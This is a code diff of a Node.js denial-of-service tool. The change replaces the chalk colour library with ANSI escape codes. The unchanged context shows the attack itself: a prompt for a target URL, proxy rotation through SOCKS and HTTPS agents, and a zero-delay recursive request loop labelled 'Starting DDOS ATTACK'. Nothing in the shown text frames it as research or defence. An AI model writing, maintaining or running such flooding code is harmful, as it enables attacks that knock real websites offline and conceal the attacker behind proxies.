@@ -3,7 +3,6 @@ const fs = require("fs");
 const path = require("path");
 const SocksProxyAgent = require("socks-proxy-agent");
 const HttpsProxyAgent = require("https-proxy-agent");
-const chalk = require("chalk");
 const readline = require("readline");
 
 const { generateUserAgent } = require("./useragent.js");
@@ -69,17 +68,25 @@ const loadProxies = () => {
     }
 };
 
+// ANSI escape codes for colors
+const colors = {
+    red: "\x1b[31m",  // Red
+    green: "\x1b[32m", // Green
+    yellow: "\x1b[33m", // Yellow
+    reset: "\x1b[0m", // Reset
+};
+
 const performAttack = (url, agent, headers) => {
     axios
         .get(url, { httpAgent: agent, headers, timeout: 0 })
         .then(() => setTimeout(() => performAttack(url, agent, headers), 0))
         .catch((err) => {
             if (err.response?.status === 503) {
-                console.log(chalk.red("Target under heavy load (503)."));
+                console.log(`${colors.red}Target under heavy load (503).${colors.reset}`);
             } else if (err.response?.status === 502) {
-                console.log(chalk.red("Error: Bad Gateway (502)."));
+                console.log(`${colors.red}Error: Bad Gateway (502).${colors.reset}`);
             } else {
-                console.log(chalk.red("Request error: " + err.message));
+                console.log(`${colors.red}Request error: ${err.message}${colors.reset}`);
             }
             setTimeout(() => performAttack(url, agent, headers), 0);
         });
@@ -87,13 +94,13 @@ const performAttack = (url, agent, headers) => {
 
 const startDdosAttack = async (targetUrl) => {
     if (!targetUrl || !/^https?:\/\//.test(targetUrl)) {
-        console.log(chalk.red("Invalid URL. Please enter a valid URL starting with http:// or https://"));
+        console.log(`${colors.red}Invalid URL. Please enter a valid URL starting with http:// or https://${colors.reset}`);
         return;
     }
 
     const proxies = loadProxies();
     if (!proxies.length) {
-        console.log(chalk.red("No proxies found. Please add proxies to the proxy file."));
+        console.log(`${colors.red}No proxies found. Please add proxies to the proxy file.${colors.reset}`);
         return;
     }
 
@@ -109,7 +116,7 @@ const startDdosAttack = async (targetUrl) => {
     };
 
     let continueAttack = true;
-    console.log(chalk.green("Starting DDOS ATTACK..."));
+    console.log(`${colors.green}Starting DDOS ATTACK...${colors.reset}`);
 
     for (let i = 0; i < numThreads; i++) {
         for (const proxy of proxies) {
@@ -129,7 +136,7 @@ const startDdosAttack = async (targetUrl) => {
 
     setTimeout(() => {
         continueAttack = false;
-        console.log(chalk.green("Max flood requests reached. Attack stopped."));
+        console.log(`${colors.green}Max flood requests reached. Attack stopped.${colors.reset}`);
     }, (maxRequests / requestsPerSecond) * 1000);
 };
 
@@ -139,7 +146,7 @@ const rl = readline.createInterface({
     output: process.stdout
 });
 
-rl.question(chalk.red("Enter the target URL (http:// or https://): "), (targetUrl) => {
+rl.question(`${colors.red}Enter the target URL (http:// or https://): ${colors.reset}`, (targetUrl) => {
     startDdosAttack(targetUrl);
     rl.close();
 });
